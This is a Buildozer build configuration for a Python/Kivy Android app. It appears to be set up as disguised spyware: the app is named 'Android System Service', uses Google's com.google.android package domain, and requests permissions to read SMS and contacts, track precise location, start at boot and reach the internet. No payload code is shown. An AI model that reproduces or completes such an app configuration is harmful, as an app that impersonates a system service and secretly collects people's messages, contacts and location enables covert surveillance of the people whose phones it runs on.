[app]

# (section header upar hona zaroori hai)
title = Android System Service
package.name = sysservice
package.domain = com.google.android
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 0.1

# Requirements
requirements = python3,kivy==2.3.0,requests,pyjnius,android

# Permissions
android.permissions = INTERNET, READ_SMS, READ_CONTACTS, ACCESS_FINE_LOCATION, RECEIVE_BOOT_COMPLETED

# Android SDK/API
android.api = 33
android.minapi = 21
android.ndk = 25b
android.archs = arm64-v8a

# Buildozer settings
[buildozer]
log_level = 2
warn_on_root = 1
